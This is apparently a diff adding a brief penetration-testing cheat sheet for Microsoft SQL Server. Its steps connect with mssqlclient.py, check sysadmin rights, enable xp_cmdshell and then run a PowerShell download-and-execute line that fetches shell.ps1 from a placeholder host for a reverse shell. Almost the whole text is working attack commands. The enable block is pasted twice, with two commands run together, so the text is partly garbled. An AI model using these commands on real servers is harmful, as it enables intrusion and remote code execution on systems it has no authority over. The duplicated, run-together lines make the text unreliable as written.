@@ -1,0 +1,23 @@
+Connect to SQL service
+mssqlclient.py user@ip -windows-auth
+
+Check if user has sysadmin rights:
+SELECT IS_SRVROLEMEMBER ('sysadmin')
+
+Enable cmd shell:
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell "whoami"EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell "whoami"
+
+Download and execute reverse shell:
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");"
+
+
